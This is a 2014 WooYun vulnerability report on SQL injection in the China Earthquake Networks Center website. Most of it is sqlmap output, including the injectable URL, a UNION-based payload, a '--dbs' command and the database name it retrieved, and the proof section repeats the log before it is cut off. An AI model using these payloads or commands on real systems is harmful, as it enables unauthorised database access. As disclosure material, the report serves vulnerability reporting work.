{"id": 42950, "wybug_id": "wooyun-2014-084273", "wybug_title": "中国地震台网主站存在SQL注入", "wybug_corp": "中国地震台网", "wybug_author": "路人甲", "wybug_date": "2014-11-24 14:31", "wybug_open_date": "2015-01-08 14:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向公众公开  简要描述： 听群里小伙伴说又地震了，于是就是中国地震台网看了下。。 详细说明：  注入点：http://www.ceic.ac.cn/history?start=%27&end=&weidu1=&weidu2=&jingdu1=&jingdu2=&height1=&height2=&zhenji1=&zhenji2=&sub=%E6%9F%A5%E8%AF%A2\n[17:09:42] [INFO] testing 'MySQL inline queries'[17:09:42] [INFO] testing 'PostgreSQL inline queries'[17:09:42] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:09:42] [INFO] testing 'Oracle inline queries'[17:09:42] [INFO] testing 'SQLite inline queries'[17:09:42] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:09:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:09:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:09:43] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:09:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:09:45] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:09:45] [INFO] testing 'Oracle AND time-based blind'[17:09:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:09:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:10:01] [WARNING] GET parameter 'jingdu1' is not injectable[17:10:01] [INFO] testing if GET parameter 'jingdu2' is dynamic[17:10:01] [WARNING] GET parameter 'jingdu2' does not appear dynamic[17:10:01] [WARNING] heuristic (basic) test shows that GET parameter 'jingdu2' might not be injectable[17:10:01] [INFO] heuristic (XSS) test shows that GET parameter 'jingdu2' mightbe vulnerable to XSS attacks[17:10:01] [INFO] testing for SQL injection on GET parameter 'jingdu2'[17:10:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:10:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:10:04] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:10:05] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:10:06] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:10:10] [INFO] testing 'MySQL inline queries'[17:10:10] [INFO] testing 'PostgreSQL inline queries'[17:10:10] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:10:10] [INFO] testing 'Oracle inline queries'[17:10:10] [INFO] testing 'SQLite inline queries'[17:10:10] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:10:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:10:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:10:13] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:10:13] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:10:14] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:10:14] [INFO] testing 'Oracle AND time-based blind'[17:10:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:10:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:10:31] [WARNING] GET parameter 'jingdu2' is not injectable[17:10:31] [INFO] testing if GET parameter 'height1' is dynamic[17:10:31] [WARNING] GET parameter 'height1' does not appear dynamic[17:10:31] [WARNING] heuristic (basic) test shows that GET parameter 'height1' might not be injectable[17:10:31] [INFO] heuristic (XSS) test shows that GET parameter 'height1' mightbe vulnerable to XSS attacks[17:10:31] [INFO] testing for SQL injection on GET parameter 'height1'[17:10:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:10:36] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:10:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:10:37] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:10:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:10:39] [INFO] testing 'MySQL inline queries'[17:10:39] [INFO] testing 'PostgreSQL inline queries'[17:10:39] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:10:39] [INFO] testing 'Oracle inline queries'[17:10:39] [INFO] testing 'SQLite inline queries'[17:10:39] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:10:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:10:40] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:10:41] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:10:42] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:10:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:10:43] [INFO] testing 'Oracle AND time-based blind'[17:10:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:10:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:10:58] [WARNING] GET parameter 'height1' is not injectable[17:10:58] [INFO] testing if GET parameter 'height2' is dynamic[17:10:58] [WARNING] GET parameter 'height2' does not appear dynamic[17:10:58] [WARNING] heuristic (basic) test shows that GET parameter 'height2' might not be injectable[17:10:58] [INFO] testing for SQL injection on GET parameter 'height2'[17:10:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:11:00] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:11:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:11:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:11:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:11:02] [INFO] testing 'MySQL inline queries'[17:11:02] [INFO] testing 'PostgreSQL inline queries'[17:11:02] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:11:02] [INFO] testing 'Oracle inline queries'[17:11:03] [INFO] testing 'SQLite inline queries'[17:11:03] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:11:03] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:11:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:11:07] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:11:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:11:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:11:09] [INFO] testing 'Oracle AND time-based blind'[17:11:10] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:11:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:11:26] [WARNING] GET parameter 'height2' is not injectable[17:11:26] [INFO] testing if GET parameter 'zhenji1' is dynamic[17:11:26] [WARNING] GET parameter 'zhenji1' does not appear dynamic[17:11:26] [WARNING] heuristic (basic) test shows that GET parameter 'zhenji1' might not be injectable[17:11:26] [INFO] heuristic (XSS) test shows that GET parameter 'zhenji1' mightbe vulnerable to XSS attacks[17:11:26] [INFO] testing for SQL injection on GET parameter 'zhenji1'[17:11:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:11:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:11:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:11:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:11:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:11:32] [INFO] testing 'MySQL inline queries'[17:11:32] [INFO] testing 'PostgreSQL inline queries'[17:11:32] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:11:32] [INFO] testing 'Oracle inline queries'[17:11:32] [INFO] testing 'SQLite inline queries'[17:11:32] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:11:33] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:11:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:11:34] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:11:35] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:11:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:11:39] [INFO] testing 'Oracle AND time-based blind'[17:11:39] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:11:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:12:00] [WARNING] GET parameter 'zhenji1' is not injectable[17:12:00] [INFO] testing if GET parameter 'zhenji2' is dynamic[17:12:00] [WARNING] GET parameter 'zhenji2' does not appear dynamic[17:12:00] [WARNING] heuristic (basic) test shows that GET parameter 'zhenji2' might not be injectable[17:12:00] [INFO] testing for SQL injection on GET parameter 'zhenji2'[17:12:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:12:02] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:12:02] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:12:03] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:12:03] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:12:04] [INFO] testing 'MySQL inline queries'[17:12:04] [INFO] testing 'PostgreSQL inline queries'[17:12:04] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:12:04] [INFO] testing 'Oracle inline queries'[17:12:04] [INFO] testing 'SQLite inline queries'[17:12:05] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:12:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:12:06] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:12:06] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:12:07] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:12:07] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:12:08] [INFO] testing 'Oracle AND time-based blind'[17:12:09] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:12:14] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[17:12:15] [INFO] target URL appears to have 24 columns in query[17:12:16] [INFO] GET parameter 'zhenji2' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectableGET parameter 'zhenji2' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[17:40:12] [INFO] testing if GET parameter 'sub' is dynamic[17:40:12] [WARNING] GET parameter 'sub' does not appear dynamic[17:40:12] [WARNING] heuristic (basic) test shows that GET parameter 'sub' might not be injectable[17:40:13] [INFO] testing for SQL injection on GET parameter 'sub'[17:40:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:40:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:40:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:40:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:40:21] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:40:21] [INFO] testing 'MySQL inline queries'[17:40:21] [INFO] testing 'PostgreSQL inline queries'[17:40:21] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:40:21] [INFO] testing 'Oracle inline queries'[17:40:22] [INFO] testing 'SQLite inline queries'[17:40:22] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:40:22] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:40:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:40:23] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:40:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:40:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:40:25] [INFO] testing 'Oracle AND time-based blind'[17:40:25] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y[17:40:49] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')[17:41:13] [INFO] testing 'Generic UNION query (83) - 1 to 10 columns'[17:41:40] [WARNING] GET parameter 'sub' is not injectablesqlmap identified the following injection points with a total of 2978 HTTP(s) requests:---Place: GETParameter: zhenji2    Type: UNION query    Title: MySQL UNION query (NULL) - 24 columns    Payload: start=%E2%80%98&end=&weidu1=&weidu2=&jingdu1=&jingdu2=&height1=&height2=&zhenji1=&zhenji2=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7177706371,0x6445504d5a614a565475,0x7165796871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&sub=%E6%9F%A5%E8%AF%A2---[17:41:40] [INFO] testing MySQL[17:41:40] [INFO] confirming MySQL[17:41:41] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.29back-end DBMS: MySQL >= 5.0.0[17:41:41] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\www.ceic.ac.cn'[*] shutting down at 17:41:41C:\\Python27\\sqlmap>sqlmap.py -u \"http://www.ceic.ac.cn/history?start=%E2%80%98&end=&weidu1=&weidu2=&jingdu1=&jingdu2=&height1=&height2=&zhenji1=&zhenji2=&sub=%E6%9F%A5%E8%AF%A2\" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141101}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:42:15[17:42:15] [WARNING] provided value for parameter 'end' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'weidu1' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'weidu2' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'jingdu1' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'jingdu2' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'height1' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'height2' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'zhenji1' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [WARNING] provided value for parameter 'zhenji2' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:42:15] [INFO] resuming back-end DBMS 'mysql'[17:42:15] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: zhenji2    Type: UNION query    Title: MySQL UNION query (NULL) - 24 columns    Payload: start=%E2%80%98&end=&weidu1=&weidu2=&jingdu1=&jingdu2=&height1=&height2=&zhenji1=&zhenji2=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7177706371,0x6445504d5a614a565475,0x7165796871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&sub=%E6%9F%A5%E8%AF%A2---[17:42:16] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.29back-end DBMS: MySQL 5[17:42:16] [INFO] fetching database names[17:42:31] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique[17:42:46] [WARNING] the SQL query provided does not return any output[17:42:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[17:42:46] [INFO] falling back to current database[17:42:46] [INFO] fetching current database[17:42:46] [WARNING] reflective value(s) found and filtering outavailable databases [1]:[*] app_dizhentai[17:42:46] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\www.ceic.ac.cn'[*] shutting down at 17:42:46\n\n\n\n\n   漏洞证明：  注入点：http://www.ceic.ac.cn/history?start=%27&end=&weidu1=&weidu2=&jingdu1=&jingdu2=&height1=&height2=&zhenji1=&zhenji2=&sub=%E6%9F%A5%E8%AF%A2\n[17:09:42] [INFO] testing 'MySQL inline queries'[17:09:42] [INFO] testing 'PostgreSQL inline queries'[17:09:42] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:09:42] [INFO] testing 'Oracle inline queries'[17:09:42] [INFO] testing 'SQLite inline queries'[17:09:42] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:09:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:09:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:09:43] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:09:44] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:09:45] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:09:45] [INFO] testing 'Oracle AND time-based blind'[17:09:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:09:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:10:01] [WARNING] GET parameter 'jingdu1' is not injectable[17:10:01] [INFO] testing if GET parameter 'jingdu2' is dynamic[17:10:01] [WARNING] GET parameter 'jingdu2' does not appear dynamic[17:10:01] [WARNING] heuristic (basic) test shows that GET parameter 'jingdu2' might not be injectable[17:10:01] [INFO] heuristic (XSS) test shows that GET parameter 'jingdu2' mightbe vulnerable to XSS attacks[17:10:01] [INFO] testing for SQL injection on GET parameter 'jingdu2'[17:10:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:10:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:10:04] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:10:05] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:10:06] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:10:10] [INFO] testing 'MySQL inline queries'[17:10:10] [INFO] testing 'PostgreSQL inline queries'[17:10:10] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:10:10] [INFO] testing 'Oracle inline queries'[17:10:10] [INFO] testing 'SQLite inline queries'[17:10:10] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:10:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:10:12] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:10:13] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:10:13] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:10:14] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:10:14] [INFO] testing 'Oracle AND time-based blind'[17:10:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:10:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:10:31] [WARNING] GET parameter 'jingdu2' is not injectable[17:10:31] [INFO] testing if GET parameter 'height1' is dynamic[17:10:31] [WARNING] GET parameter 'height1' does not appear dynamic[17:10:31] [WARNING] heuristic (basic) test shows that GET parameter 'height1' might not be injectable[17:10:31] [INFO] heuristic (XSS) test shows that GET parameter 'height1' mightbe vulnerable to XSS attacks[17:10:31] [INFO] testing for SQL injection on GET parameter 'height1'[17:10:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:10:36] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:10:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:10:37] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:10:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:10:39] [INFO] testing 'MySQL inline queries'[17:10:39] [INFO] testing 'PostgreSQL inline queries'[17:10:39] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:10:39] [INFO] testing 'Oracle inline queries'[17:10:39] [INFO] testing 'SQLite inline queries'[17:10:39] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:10:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:10:40] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:10:41] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:10:42] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:10:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:10:43] [INFO] testing 'Oracle AND time-based blind'[17:10:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:10:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:10:58] [WARNING] GET parameter 'height1' is not injectable[17:10:58] [INFO] testing if GET parameter 'height2' is dynamic[17:10:58] [WARNING] GET parameter 'height2' does not appear dynamic[17:10:58] [WARNING] heuristic (basic) test shows that GET parameter 'height2' might not be injectable[17:10:58] [INFO] testing for SQL injection on GET parameter 'height2'[17:10:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:11:00] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:11:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:11:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:11:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:11:02] [INFO] testing 'MySQL inline queries'[17:11:02] [INFO] testing 'PostgreSQL inline queries'[17:11:02] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:11:02] [INFO] testing 'Oracle inline queries'[17:11:03] [INFO] testing 'SQLite inline queries'[17:11:03] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:11:03] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:11:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:11:07] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:11:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:11:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:11:09] [INFO] testing 'Oracle AND time-based blind'[17:11:10] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:11:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:11:26] [WARNING] GET parameter 'height2' is not injectable[17:11:26] [INFO] testing if GET parameter 'zhenji1' is dynamic[17:11:26] [WARNING] GET parameter 'zhenji1' does not appear dynamic[17:11:26] [WARNING] heuristic (basic) test shows that GET parameter 'zhenji1' might not be injectable[17:11:26] [INFO] heuristic (XSS) test shows that GET parameter 'zhenji1' mightbe vulnerable to XSS attacks[17:11:26] [INFO] testing for SQL injection on GET parameter 'zhenji1'[17:11:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:11:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:11:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:11:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:11:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:11:32] [INFO] testing 'MySQL inline queries'[17:11:32] [INFO] testing 'PostgreSQL inline queries'[17:11:32] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:11:32] [INFO] testing 'Oracle inline queries'[17:11:32] [INFO] testing 'SQLite inline queries'[17:11:32] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:11:33] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:11:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:11:34] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:11:35] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:11:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:11:39] [INFO] testing 'Oracle AND time-based blind'[17:11:39] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:11:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[17:12:00] [WARNING] GET parameter 'zhenji1' is not injectable[17:12:00] [INFO] testing if GET parameter 'zhenji2' is dynamic[17:12:00] [WARNING] GET parameter 'zhenji2' does not appear dynamic[17:12:00] [WARNING] heuristic (basic) test shows that GET parameter 'zhenji2' might not be injectable[17:12:00] [INFO] testing for SQL injection on GET parameter 'zhenji2'[17:12:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:12:02] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:12:02] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:12:03] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:12:03] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:12:04] [INFO] testing 'MySQL inline queries'[17:12:04] [INFO] testing 'PostgreSQL inline queries'[17:12:04] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:12:04] [INFO] testing 'Oracle inline queries'[17:12:04] [INFO] testing 'SQLite inline queries'[17:12:05] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:12:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:12:06] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:12:06] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:12:07] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:12:07] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:12:08] [INFO] testing 'Oracle AND time-based blind'[17:12:09] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[17:12:14] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[17:12:15] [INFO] target URL appears to have 24 columns in query[17:12:16] [INFO] GET parameter 'zhenji2' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectableGET parameter 'zhenji2' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[17:40:12] [INFO] testing if GET parameter 'sub' is dynamic[17:40:12] [WARNING] GET parameter 'sub' does not appear dynamic[17:40:12] [WARNING] heuristic (basic) test shows that GET parameter 'sub' might not be injectable[17:40:13] [INFO] testing for SQL injection on GET parameter 'sub'[17:40:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[17:40:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[17:40:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[17:40:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[17:40:21] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[17:40:21] [INFO] testing 'MySQL inline queries'[17:40:21] [INFO] testing 'PostgreSQL inline queries'[17:40:21] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[17:40:21] [INFO] testing 'Oracle inline queries'[17:40:22] [INFO] testing 'SQLite inline queries'[17:40:22] [INFO] testing 'MySQL > 5.0.11 stacked queries'[17:40:22] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[17:40:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[17:40:23] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[17:40:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[17:40:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[17:40:25] [INFO] testing 'Oracle AND time-based blind'[17:40:25] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y[17:40:49] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')[17:41:13] [INFO] testing 'Generic UNION query (83) - 1 to 10 columns'[17:41:40] [WARNING] GET parameter 'sub' is not injectablesqlmap identified the following injection points with a total of 2978 HTTP(s) requests:---Place: GETParameter: zhenji2    Type: UNION query    Title: MySQL UNION query (NULL) - 24 columns    Payload: start=%E2%80%98&end=&weidu1=&weidu2=&jingdu1=&jingdu2=&height1=&height2=&zhenji1=&zhenji2=' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7177706371,0x6445504d5a614a565475,0x7165796871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&sub=%E6%9F%A5%E8%AF%A2---[17:41:40] [INFO] testing MySQL[17:41:40] [INFO] 